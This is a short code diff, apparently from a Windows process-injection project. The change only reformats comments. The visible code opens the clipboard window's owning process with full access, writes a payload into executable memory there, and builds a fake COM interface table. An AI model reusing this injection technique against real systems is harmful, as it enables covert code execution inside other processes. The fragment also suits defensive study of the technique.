@@ -23,7 +23,8 @@ VOID clipboard(LPVOID payload, DWORD payloadSize) {
     LPVOID     cs, ds;
     SIZE_T     wr;
     
-    // 1. Find a private clipboard, obtain the process id and open it
+    // 1. Find a private clipboard.
+    //    Obtain the process id and open it
     hw = FindWindowEx(HWND_MESSAGE, NULL, L"CLIPBRDWNDCLASS", NULL);
     GetWindowThreadProcessId(hw, &id);
     hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
@@ -33,7 +34,8 @@ VOID clipboard(LPVOID payload, DWORD payloadSize) {
         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
     
-    // 3. Allocate RW memory in process, initialize and write IUnknown interface
+    // 3. Allocate RW memory in process.
+    //    Initialize and write IUnknown interface
     ds = VirtualAllocEx(hp, NULL, sizeof(IUnknown_t),
         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     iu.lpVtbl  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
